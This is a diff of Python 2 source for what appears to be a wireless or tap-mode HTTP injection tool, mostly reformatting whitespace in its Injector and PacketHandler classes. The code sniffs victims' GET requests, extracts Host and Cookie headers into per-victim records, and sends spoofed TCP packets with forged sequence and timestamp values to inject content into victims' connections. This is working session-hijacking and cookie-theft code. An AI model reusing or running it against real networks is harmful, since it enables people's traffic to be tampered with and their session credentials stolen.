@@ -351,19 +351,18 @@ class Injector:
 			except:
 				raise
 
-## HERE
 		else:
-			headers=self.get_headers(injection)
+			headers = self.get_headers(injection)
 			if (TSVal is not None):
-				packet=Ether(src=self.getHwAddr(self.interface),dst=vicmac)/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),TSVal)))])/Raw(load=headers+injection)
+				packet = Ether(src = self.getHwAddr(self.interface), dst = vicmac)/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), TSVal)))])/Raw(load = headers + injection)
 			else:
-				packet=Ether(src=self.getHwAddr(self.interface),dst=vicmac)/IP(dst=vicip,src=svrip)/TCP(flags="FA",sport=int(svrport),dport=int(vicport),seq=int(seqnum),ack=int(acknum),options=[('NOP',None),('NOP',None),('Timestamp',((round(time.time()),0)))])/Raw(load=headers+injection)
+				packet = Ether(src = self.getHwAddr(self.interface), dst = vicmac)/IP(dst = vicip, src = svrip)/TCP(flags = "FA", sport = int(svrport), dport = int(vicport), seq = int(seqnum), ack = int(acknum), options = [('NOP', None), ('NOP', None), ('Timestamp', ((round(time.time()), 0)))])/Raw(load = headers + injection)
 			try:
-				sendp(packet,iface=self.interface,verbose=0)
+				sendp(packet, iface = self.interface, verbose = 0)
 			except:
 				raise
+
 			return
-		
 
 '''
 PacketHandler class
@@ -372,66 +371,74 @@ is a List of instances of Victim for targeted mode, or can be fed an instance of
 VictimParameters directly if working in broadcast mode and attacking all clients.
 '''
 class PacketHandler:
-	def __init__(self,*positional_parameters, **keyword_parameters):
+	def __init__(self, *positional_parameters, **keyword_parameters):
 		if ('victims' in keyword_parameters):
-                        self.victims=keyword_parameters['victims']
+			self.victims = keyword_parameters['victims']
 		else:
-			self.victims=[]
+			self.victims = []
+
 		if ('excluded' in keyword_parameters):
-			self.excluded=self.proc_excluded(keyword_parameters['excluded'])
+			self.excluded = self.proc_excluded(keyword_parameters['excluded'])
 		else:
-			self.excluded=None
+			self.excluded = None
+
 		if ('handler' in keyword_parameters):
 			self.handler=keyword_parameters['handler']
 		else:
-			self.handler=None
+			self.handler = None
+
 		if ('i' in keyword_parameters):
-                        self.i=keyword_parameters['i']
+			self.i = keyword_parameters['i']
 		else:
-			self.i=None
+			self.i = None
+
 		if ('victim_parameters' in keyword_parameters):
-			self.victim_parameters=keyword_parameters['victim_parameters']
+			self.victim_parameters = keyword_parameters['victim_parameters']
 		else:
-			self.victim_parameters=None
+			self.victim_parameters = None
+
 		if (self.i is None):
 			print "[ERROR] No injection interface selected"
 			exit(1)
-		if (len(self.victims)==0 and self.victim_parameters is None):
+
+		if (len(self.victims) == 0 and self.victim_parameters is None):
 			print "[ERROR] Please specify victim parameters or Victim List"
 			exit(1)
-		self.newvictims=[]
-		self.injector=Injector(self.i)
+
+		self.newvictims = []
+		self.injector = Injector(self.i)
 
 	'''
 	Check if argument provided in excluded
 	is an ip, if it's not, dns resolve it
 	and add those IPs to the exclude list
 	'''
-	def proc_excluded(self,excluded):
-		processed=set()
+	def proc_excluded(self, excluded):
+		processed = set()
 		for item in excluded:
 			try:
-				test=item.split(".")
-				if (len(test)!=4):
+				test = item.split(".")
+				if (len(test) != 4):
 					try:
 						processed.add(socket.gethostbyname(item))
 					except:
 						pass
 				else:
 					try:
-						if (int(test[0])>0 and int(test[0])<256):
-							if (int(test[0])>0 and int(test[0])<256):
-								if (int(test[0])>0 and int(test[0])<256):
-									if (int(test[0])>0 and int(test[0])<256):
+						### ?  It's all the same?  Why the nest
+						if (int(test[0]) > 0 and int(test[0]) < 256):
+							if (int(test[0]) > 0 and int(test[0]) < 256):
+								if (int(test[0]) > 0 and int(test[0]) < 256):
+									if (int(test[0]) > 0 and int(test[0]) < 256):
 										processed.add(item)
 					except:
 						processed.add(socket.gethostbyname(item))
-					
 			except:
 				try:
 					processed.add(socket.gethostbyname(item))
 				except:
 					pass
+
 		return processed
 
 	'''
@@ -440,22 +447,24 @@ class PacketHandler:
 	a List object [host,cookie] if there is
 	one, otherwise returns None
 	'''
-	def search_cookie(self,ret2):
-		if (len(ret2.strip())>0):
-			arr=ret2.split("\n")
+	def search_cookie(self, ret2):
+		if (len(ret2.strip()) > 0):
+			arr = ret2.split("\n")
 #			print ret2
-			host=""
-			cookie=""
+			host = ""
+			cookie = ""
 			for line in arr:
 				if ('Cookie' in line):
-					cookie=line.strip()
+					cookie = line.strip()
+
 				if ('Host' in line):
-					host=line.split()[1].strip()
-			if (len(host)!=0 and len(cookie)!=0):
-				return [host,cookie]
+					host = line.split()[1].strip()
+
+			if (len(host) != 0 and len(cookie) != 0):
+				return [host, cookie]
 			else:
-				if (len(host)>0):
-					return (host,None)
+				if (len(host) > 0):
+					return (host, None)
 				else:
 					return None
 		else:
@@ -465,11 +474,11 @@ class PacketHandler:
 	Extracts request payload as string from packet object
 	if there is payload, otherwise returns None
 	'''
-	def get_request(self,pkt):
+	def get_request(self, pkt):
 		ret2 = "\n".join(pkt.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
-		if (len(ret2.strip())>0):
+		if (len(ret2.strip()) > 0):
 #			print ret2.translate(None,"'").strip()
-			return ret2.translate(None,"'").strip()
+			return ret2.translate(None, "'").strip()
 		else:
 			return None
 
@@ -477,33 +486,35 @@ class PacketHandler:
 	Default packet handler, looks for GET requests
 	in the TCP layer
 	'''
-	def handle_default(self,packet):
+	def handle_default(self, packet):
 		if (packet.haslayer(IP) and packet.haslayer(TCP)):
 			#MONITOR MODE
 			if (packet.haslayer(Dot11) and not packet.haslayer(Ether)):
-				vicmac=packet.getlayer(Dot11).addr2
-				rtrmac=packet.getlayer(Dot11).addr1
+				vicmac = packet.getlayer(Dot11).addr2
+				rtrmac = packet.getlayer(Dot11).addr1
 			#TAP MODE
 			else:
-				vicmac=packet.getlayer(Ether).src
-				rtrmac=packet.getlayer(Ether).dst
-			vicip=packet.getlayer(IP).src
-			svrip=packet.getlayer(IP).dst
-			vicport=packet.getlayer(TCP).sport
-			svrport=packet.getlayer(TCP).dport
-			size=len(packet.getlayer(TCP).load)
-			acknum=str(int(packet.getlayer(TCP).seq)+size)
-			seqnum=packet.getlayer(TCP).ack
-			request=self.get_request(packet)
+				vicmac = packet.getlayer(Ether).src
+				rtrmac = packet.getlayer(Ether).dst
+
+			vicip = packet.getlayer(IP).src
+			svrip = packet.getlayer(IP).dst
+			vicport = packet.getlayer(TCP).sport
+			svrport = packet.getlayer(TCP).dport
+			size = len(packet.getlayer(TCP).load)
+			acknum = str(int(packet.getlayer(TCP).seq) + size)
+			seqnum = packet.getlayer(TCP).ack
+			request = self.get_request(packet)
 			global BLOCK_HOSTS
 			for obj in BLOCK_HOSTS:
-				ip,seq=obj
-				if (svrip==ip and seqnum!=seq):
+				ip, seq = obj
+				if (svrip == ip and seqnum != seq):
 #					print "REMOVING ",svrip
 					for obj2 in BLOCK_HOSTS:
-						ip2,seq2=obj2
-						if (ip2==svrip):
-							BLOCK_HOSTS.remove((ip2,seq2))
+						ip2, seq2 = obj2
+						if (ip2 == svrip):
+							BLOCK_HOSTS.remove((ip2, seq2))
+
 			if ("GET" not in request):
 				return 0
 #			print BLOCK_HOSTS
@@ -511,11 +522,12 @@ class PacketHandler:
 			try:
 				TSVal,TSecr=packet.getlayer(TCP).options[2][1]
 			except:
-				TSVal=None
-				TSecr=None
-			cookie=self.search_cookie(request)
-#			print (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie)
-			return (vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie,TSVal,TSecr)
+				TSVal = None
+				TSecr = None
+
+			cookie = self.search_cookie(request)
+#			print (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie)
+			return (vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie, TSVal, TSecr)
 		return None
 
 	'''
@@ -525,64 +537,70 @@ class PacketHandler:
 	added that if VictimParameters is set, it also performs a
 	broadcast attack
 	'''
-	def cookie_mgmt(self,vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum,request,cookie):
-		if (len(self.victims)==0):
+	def cookie_mgmt(self, vicmac, rtrmac, vicip, svrip, vicport, svrport, acknum, seqnum, request, cookie):
+		if (len(self.victims) == 0):
 			try:
 				k=cookie[1]
 			except:
-				cookie=["NONE","NONE"]
+				cookie=["NONE", "NONE"]
+
 			if (cookie[1] is not None):
-				exists=0
+				exists = 0
 				for victim in self.newvictims:
 					if (victim.ip is not None):
-						if (victim.ip==vicip):
+						if (victim.ip == vicip):
 							victim.add_cookie(cookie)
-							exists=1
+							exists = 1
 					else:
 						if (victim.mac is not None):
-							if (victim.mac.lower()==vicmac.lower()):
+							if (victim.mac.lower() == vicmac.lower()):
 								victim.add_cookie(cookie)
 								exists=1
-				if (exists==0):
+
+				if (exists == 0):
 #					print "here"
-					v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
+					v1=Victim(ip = vicip, mac = vicmac, victim_parameters = self.victim_parameters)
 					v1.add_cookie(cookie)
 					self.newvictims.append(v1)
+
 			else:
 				if (cookie[0] is not None and cookie[1] is None):
-#					print bcolors.WARNING+"[!] No cookie found for",cookie[0]+bcolors.ENDC
-					newcookie=[cookie[0],"NONE"]
-					cookie=newcookie
+#					print bcolors.WARNING + "[!] No cookie found for", cookie[0] + bcolors.ENDC
+					newcookie=[cookie[0], "NONE"]
+					cookie = newcookie
 					for victim in self.newvictims:
 						if (victim.ip is not None):
-							if (victim.ip==vicip):
+							if (victim.ip == vicip):
 								victim.add_cookie(cookie)
 						else:
 							if (victim.mac is not None):
-								if (victim.mac.lower()==vicmac.lower()):
+								if (victim.mac.lower() == vicmac.lower()):
 									victim.add_cookie(cookie)
+
 				exists=0
 				for victim in self.newvictims:
 					if (victim.ip is not None):
-						if (victim.ip==vicip):
-							exists=1
+						if (victim.ip == vicip):
+							exists = 1
 					else:
 						if (victim.mac is not None):
-							if (victim.mac.lower()==vicmac.lower()):
-								exists=1
-				if (exists==0):
-					v1=Victim(ip=vicip,mac=vicmac,victim_parameters=self.victim_parameters)
+							if (victim.mac.lower() == vicmac.lower()):
+								exists = 1
+				if (exists == 0):
+					v1=Victim(ip = vicip, mac = vicmac, victim_parameters = self.victim_parameters)
 					self.newvictims.append(v1)
+
 		else:
-			vic_in_targets=0
+			vic_in_targets = 0
 			try:
-				k=cookie[1]
+				k = cookie[1]
 			except:
 				try:
-					k=cookie[0]
-					cookie[1]="NONE"
+					k = cookie[0]
+					cookie[1] = "NONE"
 				except:
-					cookie=["NONE","NONE"]
+					cookie = ["NONE","NONE"]
+###HERE
 			if (cookie[1] is not None):
 				for victim in self.victims:
 					if (victim.ip is not None):
